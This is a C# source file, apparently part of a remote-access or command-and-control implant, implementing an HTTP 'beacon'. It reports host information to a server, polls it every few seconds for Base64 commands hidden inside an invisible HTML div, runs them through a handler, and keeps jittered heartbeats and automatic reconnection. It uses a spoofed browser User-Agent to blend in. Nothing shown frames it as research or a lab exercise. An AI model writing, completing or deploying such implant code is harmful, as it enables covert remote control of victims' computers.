using System;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Beacon.Helper;
using Beacon.MessagePackLib;
using static Beacon.Helper.Helper;

namespace Beacon
{
    internal class HttpBeacon
    {
        private string _host;
        private int _port;
        private bool _shouldReconnect = true;
        private bool _isConnected = false;
        private readonly object _reconnectLock = new object();
        private Timer KeepAlive { get; set; }
        private static Timer ReconnectTimer { get; set; }
        private Timer _pollTimer;
        private WebClient _webClient;
        private readonly int _pollInterval = 3000; // 3秒轮询间隔
        
        public bool Connect(string host, int port)
        {
            Console.WriteLine($"[HttpBeacon] 尝试连接到 {host}:{port}");
            
            lock (_reconnectLock)
            {
                _host = host;
                _port = port;
                _shouldReconnect = true;
            }

            return TryConnect();
        }

        private bool TryConnect()
        {
            try
            {
                Console.WriteLine($"[HttpBeacon] 开始连接尝试");
                
                CleanupConnection();
                
                // 创建Web客户端
                _webClient = new WebClient();
                _webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                
                // User-Agent已在创建时设置
                
                _isConnected = true;

                // 发送初始客户端信息
                Console.WriteLine($"[HttpBeacon] 发送初始客户端信息");
                var clientInfo = BeaconHandle.BuildClientInfo();
                Console.WriteLine($"[HttpBeacon] 客户端信息长度: {clientInfo.Length}");
                SendData(clientInfo);
                
                // 启动心跳包
                KeepAlive = new Timer(new TimerCallback(KeepAlivePacket), null,
                    new Random().Next(10 * 1000, 15 * 1000),
                    new Random().Next(10 * 1000, 15 * 1000));
                
                // 启动轮询任务
                _pollTimer = new Timer(new TimerCallback(PollServer), null, 1000, _pollInterval);
                
                Console.WriteLine($"[HttpBeacon] 连接建立成功");
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] HTTP连接失败: {ex.Message}");
                Console.WriteLine($"[!] 异常详细信息: {ex.StackTrace}");
                _isConnected = false;
                return false;
            }
        }

        private void CleanupConnection()
        {
            try
            {
                KeepAlive?.Dispose();
                _pollTimer?.Dispose();
                _webClient?.Dispose();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[HttpBeacon] 清理连接时发生异常: {ex.Message}");
            }
        }

        public void StartReconnectLoop()
        {
            Console.WriteLine($"[HttpBeacon] 启动重连循环");
            
            ReconnectTimer = new Timer((state) =>
            {
                lock (_reconnectLock)
                {
                    if (!_isConnected && _shouldReconnect)
                    {
                        Console.WriteLine($"[HttpBeacon] 尝试重连到 {_host}:{_port}");
                        
                        if (TryConnect())
                        {
                            Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] HTTP重连成功: {_host}:{_port}");
                        }
                        else
                        {
                            Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] HTTP重连失败，5秒后重试: {_host}:{_port}");
                        }
                    }
                }
            }, null, 0, 5000); // 5秒间隔
        }

        public void StopReconnect()
        {
            Console.WriteLine($"[HttpBeacon] 停止重连");
            
            lock (_reconnectLock)
            {
                _shouldReconnect = false;
                _isConnected = false;
            }
            ReconnectTimer?.Dispose();
            CleanupConnection();
        }

        private void SendData(byte[] payload)
        {
            if (_webClient == null || !_isConnected) 
            {
                Console.WriteLine($"[HttpBeacon] 无法发送数据，未连接");
                return;
            }
            
            try
            {
                Console.WriteLine($"[HttpBeacon] 发送数据，长度: {payload.Length}");
                
                // 将数据编码为Base64
                var base64Data = Convert.ToBase64String(payload);
                
                // 发送POST请求
                var url = $"http://{_host}:{_port}/";
                _webClient.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
                var response = _webClient.UploadString(url, "POST", base64Data);
                
                Console.WriteLine($"[HttpBeacon] 数据发送成功，响应长度: {response.Length}");
                
                // 处理响应数据
                if (!string.IsNullOrEmpty(response))
                {
                    // 尝试从HTML响应中解析Base64数据
                    var contentStart = response.IndexOf("<div id='content' style='display:none'>");
                    if (contentStart != -1)
                    {
                        contentStart += "<div id='content' style='display:none'>".Length;
                        var contentEnd = response.IndexOf("</div>", contentStart);
                        
                        if (contentEnd != -1)
                        {
                            var responseBase64Data = response.Substring(contentStart, contentEnd - contentStart);
                            
                            if (!string.IsNullOrEmpty(responseBase64Data))
                            {
                                try
                                {
                                    var responseData = Convert.FromBase64String(responseBase64Data);
                                    Console.WriteLine($"[HttpBeacon] 从POST响应中收到数据，长度: {responseData.Length}");
                                    ProcessReceivedData(responseData);
                                }
                                catch (FormatException ex)
                                {
                                    Console.WriteLine($"[HttpBeacon] POST响应中的Base64数据无效: {ex.Message}");
                                }
                            }
                        }
                    }
                }
            }
            catch (WebException ex)
            {
                Console.WriteLine($"[!] HTTP发送异常: {ex.Message}");
                _isConnected = false;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] HTTP发送异常: {ex.Message}");
                Console.WriteLine($"[!] 异常详细信息: {ex.StackTrace}");
                _isConnected = false;
            }
        }

        private void PollServer(object state)
        {
            if (_webClient == null || !_isConnected)
                return;

            try
            {
                // 发送GET请求获取待执行任务
                var url = $"http://{_host}:{_port}/";
                var htmlContent = _webClient.DownloadString(url);
                
                // 解析HTML中的Base64数据
                var contentStart = htmlContent.IndexOf("<div id='content' style='display:none'>");
                if (contentStart != -1)
                {
                    contentStart += "<div id='content' style='display:none'>".Length;
                    var contentEnd = htmlContent.IndexOf("</div>", contentStart);
                    
                    if (contentEnd != -1)
                    {
                        var base64Data = htmlContent.Substring(contentStart, contentEnd - contentStart);
                        
                        if (!string.IsNullOrEmpty(base64Data))
                        {
                            try
                            {
                                var decodedData = Convert.FromBase64String(base64Data);
                                Console.WriteLine($"[HttpBeacon] 收到服务器数据，长度: {decodedData.Length}");
                                ProcessReceivedData(decodedData);
                            }
                            catch (FormatException)
                            {
                                Console.WriteLine($"[HttpBeacon] 服务器返回的数据不是有效的Base64格式");
                            }
                        }
                    }
                }
            }
            catch (WebException ex)
            {
                Console.WriteLine($"[!] HTTP轮询异常: {ex.Message}");
                if (ex.Status == WebExceptionStatus.ProtocolError)
                {
                    var response = ex.Response as HttpWebResponse;
                    if (response != null && 
                        (response.StatusCode == HttpStatusCode.NotFound || 
                         response.StatusCode == HttpStatusCode.InternalServerError))
                    {
                        _isConnected = false;
                    }
                }
                else
                {
                    _isConnected = false;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] HTTP轮询异常: {ex.Message}");
                _isConnected = false;
            }
        }

        private void ProcessReceivedData(byte[] data)
        {
            try
            {
                Console.WriteLine($"[HttpBeacon] 处理接收到的数据，长度: {data.Length}");
                
                if (data == null || data.Length == 0) 
                {
                    Console.WriteLine($"[HttpBeacon] 接收到的数据为空");
                    return;
                }
                
                // 处理帧数据
                OnFrame(data);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[HttpBeacon ERROR] 处理接收数据异常: {ex.Message}");
                Console.WriteLine($"[HttpBeacon ERROR] 异常详细信息: {ex.StackTrace}");
            }
        }

        public void Error(string ex, string CID) => BeaconHandle.SendError(SendData, ex, CID);
        public void Log(string message, string CID) => BeaconHandle.SendLog(SendData, message, CID);
        public void KeepAlivePacket(object obj) => BeaconHandle.KeepAlive(SendData);

        private void OnFrame(byte[] payload) 
        {
            Console.WriteLine($"[HttpBeacon] 处理帧数据，长度: {payload.Length}");
            BeaconHandle.OnFrame(SendData, payload);
        }

        private void Invoke(BeaconMsgPack unpack_msgpack) => BeaconHandle.Invoke(SendData, unpack_msgpack);
    }
}
